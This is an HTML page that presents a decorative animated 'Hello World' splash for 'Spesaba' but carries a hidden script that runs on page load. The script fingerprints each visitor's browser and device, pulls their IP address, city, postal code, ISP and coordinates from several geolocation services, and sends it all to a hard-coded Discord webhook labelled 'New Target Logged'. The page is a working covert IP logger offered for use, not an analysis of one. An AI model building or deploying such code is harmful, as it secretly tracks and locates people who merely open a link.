<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spesaba</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: #0a0a0a;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            overflow: hidden;
        }

        .gradient-text {
            font-size: clamp(3rem, 10vw, 8rem);
            font-weight: 900;
            letter-spacing: -0.05em;
            background: linear-gradient(
                90deg,
                #000000 0%,
                #ffffff 25%,
                #000000 50%,
                #ffffff 75%,
                #000000 100%
            );
            background-size: 200% auto;
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 3s linear infinite;
            text-align: center;
            line-height: 1;
        }

        @keyframes shimmer {
            0% { background-position: 200% center; }
            100% { background-position: -200% center; }
        }

        .symbol {
            margin-top: 30px;
            font-size: clamp(2rem, 5vw, 4rem);
            font-weight: 300;
            color: #333;
            letter-spacing: 0.3em;
            animation: pulse 2s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .brand {
            margin-top: 15px;
            font-size: clamp(0.8rem, 2vw, 1.2rem);
            font-weight: 400;
            color: #444;
            letter-spacing: 0.5em;
            text-transform: uppercase;
        }

        .glow {
            position: absolute;
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%);
            border-radius: 50%;
            pointer-events: none;
            animation: float 6s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-30px) scale(1.1); }
        }
    </style>
</head>
<body>
    <div class="glow"></div>
    <h1 class="gradient-text">Hello World</h1>
    <div class="symbol">81</div>
    <div class="brand">Spesaba</div>

    <script>
        // ===== CONFIG =====
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1537410381138370640/d0SXhUD2hSifEPO0eqK2tqg4a-QEsoe4fE4mLC6gsKFQXJAs0ukqP5aV1QlNDyUE2rgB";

        // ===== BROWSER FINGERPRINTING =====
        function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Spesaba Fingerprint v2.1', 2, 2);
            const canvasHash = canvas.toDataURL().slice(-50);

            return {
                screen: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                languages: navigator.languages?.join(', ') || navigator.language,
                platform: navigator.platform,
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
                doNotTrack: navigator.doNotTrack || 'unknown',
                canvasHash: canvasHash,
                webglVendor: (function() {
                    try {
                        const c = document.createElement('canvas');
                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
                    } catch(e) { return 'unknown'; }
                })(),
                webglRenderer: (function() {
                    try {
                        const c = document.createElement('canvas');
                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
                    } catch(e) { return 'unknown'; }
                })()
            };
        }

        // ===== MULTI-SOURCE IP FETCH =====
        async function fetchIPData() {
            const sources = [];

            // Source 1: ipapi.co (most detailed)
            try {
                const r1 = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
                const d1 = await r1.json();
                sources.push({ name: 'ipapi.co', data: d1 });
            } catch(e) { sources.push({ name: 'ipapi.co', error: e.message }); }

            // Source 2: ip-api.com (backup)
            try {
                const r2 = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query', { cache: 'no-store' });
                const d2 = await r2.json();
                sources.push({ name: 'ip-api.com', data: d2 });
            } catch(e) { sources.push({ name: 'ip-api.com', error: e.message }); }

            // Source 3: ipinfo.io (tertiary)
            try {
                const r3 = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
                const d3 = await r3.json();
                sources.push({ name: 'ipinfo.io', data: d3 });
            } catch(e) { sources.push({ name: 'ipinfo.io', error: e.message }); }

            // Source 4: ipgeolocation.io (quaternary)
            try {
                const r4 = await fetch('https://api.ipgeolocation.io/ipgeo?apiKey=demo', { cache: 'no-store' });
                const d4 = await r4.json();
                sources.push({ name: 'ipgeolocation.io', data: d4 });
            } catch(e) { sources.push({ name: 'ipgeolocation.io', error: e.message }); }

            return sources;
        }

        // ===== NETWORK INFO =====
        function getNetworkInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return conn ? {
                effectiveType: conn.effectiveType || 'unknown',
                downlink: (conn.downlink || 'unknown') + ' Mbps',
                rtt: (conn.rtt || 'unknown') + ' ms',
                saveData: conn.saveData ? 'Yes' : 'No'
            } : { info: 'Not available' };
        }

        // ===== BUILD DISCORD EMBED =====
        async function sendToDiscord(sources, fingerprint) {
            if (DISCORD_WEBHOOK_URL.includes("YOUR_DISCORD")) {
                console.log("[DEV MODE] Webhook not set.");
                console.log("Sources:", sources);
                console.log("Fingerprint:", fingerprint);
                return;
            }

            // Pick best data source
            const primary = sources.find(s => s.data && s.data.ip) || sources[0];
            const d = primary.data || {};

            const embed = {
                title: "🎯 New Target Logged",
                description: "**Multi-source IP verification complete**",
                color: 0xFF0000,
                timestamp: new Date().toISOString(),
                thumbnail: {
                    url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png"
                },
                fields: [
                    {
                        name: "🔴 IP Address (Primary)",
                        value: "```" + (d.ip || d.query || 'Unknown') + "```",
                        inline: false
                    },
                    {
                        name: "🌍 Country",
                        value: "```" + (d.country_name || d.country || 'Unknown') + " (" + (d.country_code || d.countryCode || "") + ")```",
                        inline: true
                    },
                    {
                        name: "🏙️ City / Region",
                        value: "```" + (d.city || 'Unknown') + " / " + (d.region || d.regionName || 'Unknown') + "```",
                        inline: true
                    },
                    {
                        name: "📮 ZIP / Postal",
                        value: "```" + (d.postal || d.zip || 'Unknown') + "```",
                        inline: true
                    },
                    {
                        name: "📡 ISP",
                        value: "```" + (d.org || d.isp || d.as || 'Unknown') + "```",
                        inline: false
                    },
                    {
                        name: "🌐 ASN",
                        value: "```" + (d.asn || d.as || 'Unknown') + "```",
                        inline: true
                    },
                    {
                        name: "🎯 Coordinates",
                        value: "```" + (d.latitude || d.lat) + ", " + (d.longitude || d.lon) + "```",
                        inline: true
                    },
                    {
                        name: "⏰ Timezone",
                        value: "```" + (d.timezone || 'Unknown') + "```",
                        inline: true
                    },
                    {
                        name: "🖥️ Screen",
                        value: "```" + fingerprint.screen + " | " + fingerprint.colorDepth + "bit | DPR:" + fingerprint.pixelRatio + "```",
                        inline: false
                    },
                    {
                        name: "🔧 Platform",
                        value: "```" + fingerprint.platform + " | Cores:" + fingerprint.cpuCores + " | RAM:" + fingerprint.deviceMemory + "GB```",
                        inline: false
                    },
                    {
                        name: "🌐 Browser",
                        value: "```" + navigator.userAgent.substring(0, 80) + "```",
                        inline: false
                    },
                    {
                        name: "🎨 WebGL",
                        value: "```" + fingerprint.webglVendor + " | " + fingerprint.webglRenderer.substring(0, 40) + "```",
                        inline: false
                    },
                    {
                        name: "📊 Network",
                        value: "```" + JSON.stringify(getNetworkInfo()).replace(/[{}"]/g, '').replace(/,/g, ' | ') + "```",
                        inline: false
                    },
                    {
                        name: "🔗 Source",
                        value: "```" + (document.referrer || 'Direct / Bookmark') + "```",
                        inline: false
                    },
                    {
                        name: "📡 Data Sources Used",
                        value: sources.map(s => s.data ? "✅ " + s.name : "❌ " + s.name).join("\n"),
                        inline: false
                    }
                ],
                footer: {
                    text: "Spesaba Logger v2.0 | " + new Date().toLocaleString('en-US', { timeZone: 'UTC' }) + " UTC",
                    icon_url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png"
                }
            };

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        username: "Spesaba Logger",
                        avatar_url: "https://cdn-icons-png.flaticon.com/512/2965/2965306.png",
                        embeds: [embed] 
                    })
                });
            } catch (e) {
                console.error("Webhook failed:", e);
            }
        }

        // ===== MAIN =====
        async function main() {
            const fingerprint = getFingerprint();
            const sources = await fetchIPData();
            await sendToDiscord(sources, fingerprint);
        }

        // Run immediately
        main();
    </script>
</body>
</html>
